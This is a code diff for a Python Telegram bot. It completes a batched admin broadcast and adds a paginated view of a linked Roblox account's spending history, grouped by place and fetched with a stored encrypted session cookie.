+        nonlocal sent, failed
+        async with sem:
+            try:
+                for ref in buf:
+                    await cb.message.bot.copy_message(chat_id=uid,
+                                                      from_chat_id=ref["chat_id"],
+                                                      message_id=ref["message_id"],
+                                                      disable_notification=True)
+                sent += 1
+            except Exception as e:
+                failed += 1
+                logger.warning(f"broadcast to {uid} failed: {e}")
+
+    for i in range(0, len(users), BROADCAST_BATCH):
+        chunk = users[i:i+BROADCAST_BATCH]
+        await asyncio.gather(*(send_one(u) for u in chunk), return_exceptions=True)
+        if i + BROADCAST_BATCH < len(users):
+            await asyncio.sleep(BROADCAST_DELAY)
+
+    await cb.message.edit_text(f"✅ Готово. Успешно: {sent}, не удалось: {failed}.", reply_markup=kb_admin_main())
+
+
+# ======================= SPENDING (categories, paginated, i18n) =======================
+import math, html, asyncio, time
+
+_SP_PAGE_PLACES = 6        # categories (places) per page
+_SP_PAGE_ITEMS  = 20       # items per page
+_SP_MEM_TTL     = 10 * 60  # seconds
+
+# key=(tg_id,rid) -> {'ts': time, 'places': [(name,cnt,sum)], 'items': [list[tx]]}
+_SP_MEM: dict[tuple[int, int], dict] = {}
+
+def _sp_trim(s: str, n: int = 40) -> str:
+    s = (s or '').strip()
+    return s if len(s) <= n else s[: n - 1] + T('common.ellipsis')
+
+def _sp_price(tx: dict) -> int:
+    v = tx.get('raw_amount')
+    try:
+        return int(v) if v is not None else 0
+    except Exception:
+        return 0
+
+def _sp_place_of(tx: dict) -> str:
+    return (tx.get('place') or tx.get('creator') or tx.get('source') or tx.get('seller') or T('common.unknown'))
+
+def _sp_total(rows: list[dict]) -> int:
+    return sum(_sp_price(x) for x in rows or [])
+
+def _sp_group(rows: list[dict]):
+    bucket = {}
+    for tx in rows or []:
+        bucket.setdefault(_sp_place_of(tx), []).append(tx)
+    places, items_by_place = [], []
+    for name, arr in bucket.items():
+        arr.sort(key=_sp_price, reverse=True)
+        total = sum(_sp_price(x) for x in arr)
+        places.append((name, len(arr), total))
+        items_by_place.append(arr)
+    order = sorted(range(len(places)), key=lambda i: (-places[i][2], places[i][0].lower()))
+    places = [places[i] for i in order]
+    items_by_place = [items_by_place[i] for i in order]
+    grand = _sp_total(rows)
+    return places, items_by_place, grand
+
+def _sp_kb_places(rid: int, places, page: int):
+    total_pages = max(1, math.ceil(len(places) / _SP_PAGE_PLACES))
+    page = max(0, min(page, total_pages - 1))
+    start = page * _SP_PAGE_PLACES
+    chunk = places[start:start + _SP_PAGE_PLACES]
+
+    rows = []
+    for idx, (name, cnt, ssum) in enumerate(chunk, start=start):
+        label = f"{_sp_trim(name)} ({cnt} • {ssum} {T('currency.robux')})"
+        rows.append([InlineKeyboardButton(text=label, callback_data=f"s:o:{rid}:{idx}:0")])
+
+    nav = []
+    if page > 0:
+        nav.append(InlineKeyboardButton(text='◀️', callback_data=f's:p:{rid}:{page-1}'))
+    nav.append(InlineKeyboardButton(text=T('inventory_view.page', current=page+1, total=total_pages), callback_data='noop'))
+    if page + 1 < total_pages:
+        nav.append(InlineKeyboardButton(text='▶️', callback_data=f's:p:{rid}:{page+1}'))
+    if nav:
+        rows.append(nav)
+
+    rows.append([InlineKeyboardButton(text=T('buttons.refresh'),        callback_data=f"s:r:{rid}")])
+    rows.append([InlineKeyboardButton(text=T('buttons.back_to_profile'), callback_data=f"acct:{rid}")])
+    return InlineKeyboardMarkup(inline_keyboard=rows)
+
+def _sp_kb_items(rid: int, idx: int, page: int, total_pages: int):
+    rows = []
+    nav = []
+    if page > 0:
+        nav.append(InlineKeyboardButton(text='◀️', callback_data=f's:o:{rid}:{idx}:{page-1}'))
+    nav.append(InlineKeyboardButton(text=T('inventory_view.page', current=page+1, total=total_pages), callback_data='noop'))
+    if page + 1 < total_pages:
+        nav.append(InlineKeyboardButton(text='▶️', callback_data=f's:o:{rid}:{idx}:{page+1}'))
+    if nav:
+        rows.append(nav)
+    rows.append([InlineKeyboardButton(text=T('nav.spending'),           callback_data=f's:p:{rid}:0')])
+    rows.append([InlineKeyboardButton(text=T('buttons.back_to_profile'), callback_data=f'acct:{rid}')])
+    return InlineKeyboardMarkup(inline_keyboard=rows)
+
+def _sp_mem_get(tg_id: int, rid: int):
+    rec = _SP_MEM.get((tg_id, rid))
+    if not rec: return None
+    if rec['ts'] < time.time() - _SP_MEM_TTL:
+        _SP_MEM.pop((tg_id, rid), None)
+        return None
+    return rec
+
+def _sp_mem_set(tg_id: int, rid: int, places, items_by_place, total_sum: int | None = None):
+    # Backward-compatible: if total_sum isn't provided, compute from places [(name, cnt, ssum), ...]
+    if total_sum is None:
+        try:
+            total_sum = sum(int(x[2]) for x in (places or []) if len(x) >= 3)
+        except Exception:
+            total_sum = 0
+    _SP_MEM[(tg_id, rid)] = {
+        'ts': time.time(),
+        'places': places,
+        'items': items_by_place,
+        'total_sum': total_sum,
+    }
+
+async def _sp_fetch_rows(tg_id: int, rid: int, limit: int = 500):
+    enc = await storage.get_encrypted_cookie(tg_id, rid)
+    if not enc:
+        return []
+    from roblox_client import get_spending_history_by_encrypted_cookie
+    rows = await get_spending_history_by_encrypted_cookie(enc, rid, limit=limit, use_cache=False)
+    return rows or []
+
+def _sp_render_items(arr, page: int):
+    total_pages = max(1, math.ceil(len(arr) / _SP_PAGE_ITEMS))
+    page = max(0, min(page, total_pages - 1))
+    start = page * _SP_PAGE_ITEMS
+    chunk = arr[start:start + _SP_PAGE_ITEMS]
+
+    lines = []
+    for tx in chunk:
+        price = _sp_price(tx)
+        nm = html.escape(tx.get('name') or tx.get('item_name') or tx.get('productName') or '—')
+        dt = (tx.get('date') or tx.get('created') or '')[:19].replace('T', ' ')
+        lines.append(f"• {nm} — {price} {T('currency.robux')} ({dt})")
+
+    body = "\n".join(lines) if lines else T('spending.empty')
+    title = T('spending.title', total=len(arr))
+    return f"{title}\n\n{body}", total_pages
+
+@router.callback_query(F.data.startswith('spend:'))
+async def cb_spend_entry(call: types.CallbackQuery):
+    await protect_language(call.from_user.id)
+    try: await call.answer(cache_time=1)
+    except: pass
+
+    tg = call.from_user.id
+    rid = int(call.data.split(':', 1)[1])
+    wait = await call.message.answer(T('spending.loading'))
+
+    try:
+        rec = _sp_mem_get(tg, rid)
+        if not rec:
+            rows = await _sp_fetch_rows(tg, rid, 500)
+            places, items_by_place, grand = _sp_group(rows)
+            _sp_mem_set(tg, rid, places, items_by_place)
+            rec = _sp_mem_get(tg, rid)
+
+        kb = _sp_kb_places(rid, rec['places'], 0)
+        header = T('spending.header', sum=rec.get('total_sum', 0))
+        await wait.edit_text(header, reply_markup=kb)
+    except Exception as e:
+        try:    await wait.edit_text(T('errors.generic', err=str(e)))
+        except: await call.message.answer(T('errors.generic', err=str(e)))
+
+@router.callback_query(F.data.startswith('s:r:'))
+async def cb_spend_refresh(call: types.CallbackQuery):
+    await protect_language(call.from_user.id)
+    try: await call.answer()
+    except: pass
+
+    rid = int(call.data.split(':')[-1])
+    tg = call.from_user.id
+    wait = await call.message.answer(T('spending.loading'))
+
+    rows = await _sp_fetch_rows(tg, rid, 500)
+    places, items_by_place, grand = _sp_group(rows)
+    _sp_mem_set(tg, rid, places, items_by_place)
+
+    kb = _sp_kb_places(rid, places, 0)
+    header = T('spending.header', sum=grand)
+    try:    await wait.edit_text(header, reply_markup=kb)
+    except: await call.message.answer(header, reply_markup=kb)
+
+@router.callback_query(F.data.startswith('s:p:'))
+async def cb_spend_page(call: types.CallbackQuery):
+    await protect_language(call.from_user.id)
+    try: await call.answer()
+    except: pass
+
+    _, _, rid, page = call.data.split(':', 3)
+    rid, page = int(rid), max(0, int(page))
+    rec = _sp_mem_get(call.from_user.id, rid)
+    if not rec:
+        return await cb_spend_entry(call)
+
+    kb = _sp_kb_places(rid, rec['places'], page)
+    header = T('spending.header', sum=rec.get('total_sum', 0))
+    try:    await call.message.edit_text(header, reply_markup=kb)
+    except: await call.message.answer(header, reply_markup=kb)
+
+@router.callback_query(F.data.startswith('s:o:'))
+async def cb_spend_open(call: types.CallbackQuery):
+    await protect_language(call.from_user.id)
+    try: await call.answer()
+    except: pass
+
+    _, _, rid, idx, page = call.data.split(':', 4)
+    rid, idx, page = int(rid), int(idx), max(0, int(page))
+    rec = _sp_mem_get(call.from_user.id, rid)
+    if not rec:
+        return await cb_spend_entry(call)
+
+    items = rec['items'][idx] if 0 <= idx < len(rec['items']) else []
+    text, total_pages = _sp_render_items(items, page)
+    kb = _sp_kb_items(rid, idx, page, total_pages)
+    try:    await call.message.edit_text(text, reply_markup=kb, parse_mode='HTML', disable_web_page_preview=True)
+    except: await call.message.answer(text, reply_markup=kb, parse_mode='HTML', disable_web_page_preview=True)
+# ======================= /SPENDING =======================
+
+
+
+@router.callback_query(F.data.regexp(r'^pub_spend:(\d+)$'))
+async def cb_public_spending_locked(call: types.CallbackQuery) -> None:
+    await protect_language(call.from_user.id)
+    try:
+        await call.answer(cache_time=1)
+    except Exception:
+        pass
+    try:
+        rid = int(call.data.split(':', 1)[1])
+    except Exception:
+        rid = 0
+    await edit_or_send(call.message, L('public.spending_login_required'))
